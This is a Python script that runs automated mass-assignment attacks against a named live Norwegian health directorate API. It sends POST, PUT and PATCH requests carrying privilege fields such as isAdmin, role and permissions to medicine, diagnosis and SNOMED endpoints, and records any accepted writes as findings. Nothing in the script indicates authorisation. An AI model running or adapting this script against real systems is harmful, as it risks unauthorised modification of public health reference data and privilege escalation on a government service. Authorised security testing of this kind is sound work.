import requests
import json
import time
import itertools

BASE_URL = "https://fat.kote.helsedirektoratet.no"

headers = {
    "Accept-Language": "nb",
    "Accept": "application/json",
    "Content-Type": "application/json"
}

def test_mass_assignment():
    """Test for mass assignment vulnerabilities (also known as auto-binding vulnerabilities)"""
    print("Testing for mass assignment vulnerabilities...")
    
    # Endpoints that might allow POST/PUT operations
    post_endpoints = [
        "/api/fest/merkevarer",  # This POST endpoint was found in the swagger
        "/api/medicines/clinical-drugs",
        "/api/diagnosis/icpc2",
        "/api/code-systems"
    ]
    
    # Sensitive parameter names to test
    sensitive_params = [
        "admin", 
        "isAdmin", 
        "role", 
        "roles", 
        "permissions",
        "isVerified", 
        "verified", 
        "access_level", 
        "accessLevel",
        "userType", 
        "user_type",
        "accountType",
        "account_type",
        "isActive",
        "active",
        "enabled",
        "isEnabled",
        "isPremium",
        "premium",
        "isGold",
        "isSilver"
    ]
    
    # Create test objects with combinations of sensitive parameters
    test_objects = []
    
    # 1. Create objects with single sensitive parameter
    for param in sensitive_params:
        test_objects.append({param: True})
        test_objects.append({param: "admin"})
        test_objects.append({param: 9999})
    
    # 2. Create objects with common object + sensitive parameter
    base_object = {
        "id": "test123",
        "name": "Test Object",
        "description": "Testing for mass assignment"
    }
    
    for param in sensitive_params:
        obj = base_object.copy()
        obj[param] = True
        test_objects.append(obj)
    
    # Test each endpoint with each object
    findings = []
    
    for endpoint in post_endpoints:
        url = f"{BASE_URL}{endpoint}"
        
        for i, test_obj in enumerate(test_objects):
            try:
                # Try POST
                response = requests.post(url, headers=headers, json=test_obj, timeout=10)
                
                # Check for unexpected success responses
                if response.status_code in [200, 201, 202, 204]:
                    findings.append({
                        "type": "possible_mass_assignment",
                        "endpoint": endpoint,
                        "method": "POST",
                        "test_object": test_obj,
                        "status_code": response.status_code,
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                        "risk": "High"
                    })
                
                # Also check for 400 Bad Request with specific details
                elif response.status_code == 400:
                    # Look for error messages mentioning our sensitive parameters
                    for param in test_obj.keys():
                        if param.lower() in response.text.lower():
                            findings.append({
                                "type": "parameter_processed",
                                "endpoint": endpoint,
                                "method": "POST",
                                "parameter": param,
                                "status_code": 400,
                                "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                                "risk": "Medium"
                            })
                
                # Try PUT too (if available)
                response = requests.put(url, headers=headers, json=test_obj, timeout=10)
                
                if response.status_code in [200, 201, 202, 204]:
                    findings.append({
                        "type": "possible_mass_assignment",
                        "endpoint": endpoint,
                        "method": "PUT",
                        "test_object": test_obj,
                        "status_code": response.status_code,
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                        "risk": "High"
                    })
            except requests.exceptions.Timeout:
                # Timeouts are interesting and might indicate processing
                findings.append({
                    "type": "request_timeout",
                    "endpoint": endpoint,
                    "test_object": test_obj,
                    "risk": "Low"
                })
            except Exception as e:
                pass  # Ignore other errors
            
            # Avoid overwhelming the server - add a small delay
            if i % 5 == 0:
                time.sleep(1)
    
    # Also try endpoints with IDs
    id_endpoints = [
        "/api/medicines/clinical-drugs/12345",
        "/api/diagnosis/icpc2/12345",
        "/api/snomed/12345",
        "/api/fest/merkevarer/12345"
    ]
    
    for endpoint in id_endpoints:
        url = f"{BASE_URL}{endpoint}"
        
        # Just test a subset to avoid too many requests
        for test_obj in test_objects[:5]:
            try:
                # Try PUT
                response = requests.put(url, headers=headers, json=test_obj, timeout=10)
                
                if response.status_code in [200, 201, 202, 204]:
                    findings.append({
                        "type": "possible_mass_assignment",
                        "endpoint": endpoint,
                        "method": "PUT",
                        "test_object": test_obj,
                        "status_code": response.status_code,
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                        "risk": "High"
                    })
                
                # Try PATCH too
                response = requests.patch(url, headers=headers, json=test_obj, timeout=10)
                
                if response.status_code in [200, 201, 202, 204]:
                    findings.append({
                        "type": "possible_mass_assignment",
                        "endpoint": endpoint,
                        "method": "PATCH",
                        "test_object": test_obj,
                        "status_code": response.status_code,
                        "response_preview": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                        "risk": "High"
                    })
            except Exception as e:
                pass  # Ignore errors
            
            time.sleep(1)  # Small delay
    
    # Save findings
    if findings:
        with open("mass_assignment_findings.json", "w", encoding="utf-8") as f:
            json.dump(findings, f, indent=2)
        
        print(f"Found {len(findings)} potential mass assignment issues. Details saved to mass_assignment_findings.json")
    else:
        print("No mass assignment vulnerabilities detected.")
    
    return findings

if __name__ == "__main__":
    print("Starting mass assignment vulnerability tests against Helsedirektoratet API...")
    findings = test_mass_assignment()